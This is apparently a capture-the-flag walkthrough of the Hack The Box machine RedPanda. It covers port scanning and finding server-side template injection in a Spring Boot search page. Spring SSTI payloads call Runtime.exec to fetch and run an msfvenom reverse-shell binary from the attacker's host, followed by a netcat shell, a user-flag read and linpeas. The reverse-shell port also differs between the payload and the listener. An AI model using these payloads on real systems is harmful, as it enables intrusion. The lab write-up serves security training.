# Hack The Box - redPanda Walkthrough without Metasploit

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/RedPanda]
└─$ sudo nmap -sC -sV -O -T4 10.10.11.170 -oN nmap/initial
[sudo] password for darshan: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-23 10:08 EST
Nmap scan report for 10.10.11.170
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Mon, 23 Jan 2023 15:08:55 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Mon, 23 Jan 2023 15:08:55 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Mon, 23 Jan 2023 15:08:56 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
|_http-title: Red Panda Search | Made with Spring Boot
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=1/23%Time=63CEA303%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,690,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;charse
SF:t=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Mon,\x2023\x20Jan\x20
SF:2023\x2015:08:55\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20htm
SF:l>\n<html\x20lang=\"en\"\x20dir=\"ltr\">\n\x20\x20<head>\n\x20\x20\x20\
SF:x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<meta\x20author=\"woode
SF:n_k\">\n\x20\x20\x20\x20<!--Codepen\x20by\x20khr2003:\x20https://codepe
SF:n\.io/khr2003/pen/BGZdXw\x20-->\n\x20\x20\x20\x20<link\x20rel=\"stylesh
SF:eet\"\x20href=\"css/panda\.css\"\x20type=\"text/css\">\n\x20\x20\x20\x2
SF:0<link\x20rel=\"stylesheet\"\x20href=\"css/main\.css\"\x20type=\"text/c
SF:ss\">\n\x20\x20\x20\x20<title>Red\x20Panda\x20Search\x20\|\x20Made\x20w
SF:ith\x20Spring\x20Boot</title>\n\x20\x20</head>\n\x20\x20<body>\n\n\x20\
SF:x20\x20\x20<div\x20class='pande'>\n\x20\x20\x20\x20\x20\x20<div\x20clas
SF:s='ear\x20left'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='ear\x20r
SF:ight'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='whiskers\x20left'>
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\x
SF:20\x20\x20<div\x20class='whiskers\x20right'>\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20</
SF:div>\n\x20\x20\x20\x20\x20\x20<div\x20class='face'>\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20<div\x20class='eye")%r(HTTPOptions,75,"HTTP/1\.1\x20200\x
SF:20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nContent-Length:\x200\r\nDate:\x20Mo
SF:n,\x2023\x20Jan\x202023\x2015:08:55\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/
SF:html;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435
SF:\r\nDate:\x20Mon,\x2023\x20Jan\x202023\x2015:08:56\x20GMT\r\nConnection
SF::\x20close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>H
SF:TTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x2
SF:0type=\"text/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1
SF:,\x20h2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x
SF:20{font-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px
SF:;}\x20p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{heigh
SF:t:1px;background-color:#525D76;border:none;}</style></head><body><h1>HT
SF:TP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></html
SF:>");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=1/23%OT=22%CT=1%CU=42899%PV=Y%DS=2%DC=I%G=Y%TM=63CEA33
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST1
OS:1NW7%O6=M537ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T3(R=N)T4(
OS:R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F
OS:=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T
OS:=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RI
OS:D=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.34 seconds
```

Before starting enumeration, I ran a more comprehensive nmap scan in the background to make sure that I did not miss anything.

So I ran an Rustscan to covers all ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/RedPanda]
└─$ rustscan 10.10.11.170 --range 1-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.config/rustscan/config.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.170:22
Open 10.10.11.170:8080
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 22,8080 10.10.11.170

Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-23 10:09 EST
Initiating Ping Scan at 10:09
Scanning 10.10.11.170 [2 ports]
Completed Ping Scan at 10:09, 0.13s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:09
Completed Parallel DNS resolution of 1 host. at 10:09, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 10:09
Scanning 10.10.11.170 [2 ports]
Discovered open port 22/tcp on 10.10.11.170
Discovered open port 8080/tcp on 10.10.11.170
Completed Connect Scan at 10:09, 0.36s elapsed (2 total ports)
Nmap scan report for 10.10.11.170
Host is up, received conn-refused (0.17s latency).
Scanned at 2023-01-23 10:09:58 EST for 1s

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack
8080/tcp open  http-proxy syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.56 seconds
```

## Enumeration
Visiting the website on port `8080`, I found out that the site is for a panda search

![rp-1](https://user-images.githubusercontent.com/87711310/214075853-2ed1a5eb-5fe0-4593-9c1f-f9399078669d.png)

When I pressed the search button, it shows that the machine has `/search` directory and might require us to perform some kind of `injection`.

![rp-2](https://user-images.githubusercontent.com/87711310/214075859-0bb4648f-aa76-43f0-b565-f7c536e0bc08.png)

Firstly, I tried performing SQL Injection and it did not work.

![rp-3](https://user-images.githubusercontent.com/87711310/214078934-6fa40d05-fff5-4800-9549-cd17c0714a1d.png)

So then I tried `Server-Side Template Injection (SSTI)` and realized it works! I tried `#{7*7}` which works. You can obtain the list of SSTI payloads from [here](https://github.com/payloadbox/ssti-payloads)

![rp-4](https://user-images.githubusercontent.com/87711310/214079778-aae6db4e-0f4b-4d2f-9f1a-9187ac5e5387.png)

Now that I had identified the type of injection, it was time to identify which programming language was used at the backend.

If I try `*{7*'7'}`, it wouldn’t work. This is an indicator that it is not a Python program.

Then, I tried `<%=7*7%>`, it wouldn’t work. This is an indicator that it is not a Ruby program.

So, then I tried `*{7*'7'}`, I received this error page. A quick Google of the error message allows me to find out it uses `Spring` Framework.

![rp-5](https://user-images.githubusercontent.com/87711310/214082596-e9447b3f-3bf4-472b-bc08-f7e9cfa732e3.png)

Googling of SpringFramework’s SSTI allows me to find a cheat sheet for it. I tested `*{"dfd".replace("d","x")}` and it works as characters `d` are replaced with `x`.

![rp-6](https://user-images.githubusercontent.com/87711310/214083002-29a8f45c-0f6d-47cc-95ab-a1b2c9620e09.png)


Apart from this, while doing some testing,  I received an error message that it contains banned characters. Further testing allows me to find out characters like `underscore (_)` and `percentage (%)`, are banned.

![rp-7](https://user-images.githubusercontent.com/87711310/214091147-d5361a25-c9e0-4d7f-97e1-5bfb7a99e2dd.png)


I also tried to test with cURL by hosting an HTTP server on my kali and send a `cURL` request using `SSTI` on the search bar.

```java
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("curl http://10.10.16.2")}
```

My kali was able to receive an incoming connection.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/RedPanda]
└─$ python3 -m http.server 80                  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.170 - - [24/Jan/2023 00:45:47] "GET / HTTP/1.1" 200 -
```

Now, to get a reverse shell from the website, I, firstly, generated a reverse shell using `msfvenom`

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.2 LPORT=9999 -f elf > shell.elf
```

Started my `Netcat` listener for the reverse shell.

```
nc -lvnp 9999
```

Started my HTTP server in the same location as `shell.elf`. Then sent the following commands one by one over the website’s search bar to transfer shell.elf, change its permission, and execute it.

```
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget 10.10.16.2/shell.elf")}

*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("chmod 777 ./shell.elf")}

*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("./shell.elf")}
```

Once I sent the final execute command, I got a shell on my netcat listener

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/RedPanda]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.170] 52392
whoami
woodenk
python3 -c 'import pty; pty.spawn("/bin/bash")'
woodenk@redpanda:/tmp/hsperfdata_woodenk$ ls

```

Then, I upgraded the shell and looked out for the user flag.

```
woodenk@redpanda:/tmp/hsperfdata_woodenk$ cd /home
cd /home
woodenk@redpanda:/home$ ls
ls
woodenk
woodenk@redpanda:/home$ cd woodenk
cd woodenk
woodenk@redpanda:/home/woodenk$ ls
ls
user.txt
woodenk@redpanda:/home/woodenk$ cat user.txt
cat user.txt
[REDACTED]

```

Tried running `sudo -l` but it asked me for `woodenk's` password, so I had to find another way. I uploaded `linpeas` to the target machine to find out some thing we can leverage to escalate privileges.


```
woodenk@redpanda:/home/woodenk$ wget 10.10.16.2/linpeas.sh
wget 10.10.16.2/linpeas.sh
--2023-01-24 06:13:17--  http://10.10.16.2/linpeas.sh
Connecting to 10.10.16.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 777018 (759K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 758.81K   680KB/s    in 1.1s    

2023-01-24 06:13:19 (680 KB/s) - ‘linpeas.sh’ saved [777018/777018]

woodenk@redpanda:/home/woodenk$ chmod +x linpeas.sh
chmod +x linpeas.sh

```
I couldn't find any useful result from linpeas. So, then, I ran pspy to monitor the processes ran on the machine and I found something interesting here. 

![rp-8](https://user-images.githubusercontent.com/87711310/214227654-bc642244-10aa-4c41-8096-3d43cee680ae.png)
